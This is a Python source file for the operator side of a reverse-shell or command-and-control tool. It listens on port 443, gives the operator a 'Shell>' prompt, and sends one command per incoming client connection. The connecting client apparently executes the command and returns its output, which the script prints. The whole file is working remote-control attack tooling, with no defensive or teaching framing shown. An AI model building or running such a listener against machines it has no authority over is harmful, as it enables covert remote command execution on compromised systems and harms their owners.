import socket
import sys

HOST = "0.0.0.0"
PORT = 443

def recv_all(conn, timeout=30.0, bufsize=4096):
    data = b""
    conn.settimeout(timeout)
    try:
        while True:
            chunk = conn.recv(bufsize)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    finally:
        conn.settimeout(None)
    return data

def pretty_print(cmd, raw):
    text = raw.decode("utf-8", errors="replace").replace("\r\n", "\n").rstrip()
    print(f"\n--- Command: {cmd} ---")
    print(text if text else "[No Output]")
    print(f"--- End ({len(text.splitlines())} lines) ---\n")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen()
    print(f"Listening on {HOST}:{PORT} ...")
    try:
        while True:
            print("Waiting for client to connect (one command per connection)...")
            conn, addr = s.accept()
            with conn:
                print(f"[+] Connected by {addr}")
                try:
                    cmd = input("Shell> ").strip()
                except (KeyboardInterrupt, EOFError):
                    print("\nExiting.")
                    sys.exit(0)
                if not cmd:
                    print("[-] Empty command — closing connection.")
                    continue

                try:
                    conn.sendall((cmd + "\n").encode())
                    # IMPORTANT: signal EOF to client so it stops recv() and runs the command
                    conn.shutdown(socket.SHUT_WR)
                except BrokenPipeError:
                    print("[!] Broken pipe while sending — client disconnected.")
                    continue

                # wait for output (use the higher timeout)
                raw = recv_all(conn)
                pretty_print(cmd, raw)

                print("[*] Command handled — connection closed by server or client.\n")
    except KeyboardInterrupt:
        print("\nServer shutting down.")
